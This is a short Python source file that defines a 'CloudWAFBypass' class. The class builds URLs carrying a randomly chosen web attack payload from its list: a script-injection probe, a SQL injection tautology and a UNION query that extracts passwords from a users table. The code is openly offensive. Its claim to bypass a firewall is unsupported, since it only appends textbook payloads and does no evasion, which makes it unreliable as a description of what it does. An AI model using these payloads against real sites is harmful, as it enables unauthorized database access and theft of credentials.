import random

class CloudWAFBypass:
    def __init__(self):
        pass

    def bypass_cloud_waf(self, url):
        # Simple logic to simulate WAF bypass
        waf_bypass_payloads = [
            "<script>alert(1)</script>", 
            "1' OR 1=1 --", 
            "admin' UNION SELECT null, password FROM users --"
        ]
        payload = random.choice(waf_bypass_payloads)
        return f"{url}?input={payload}"
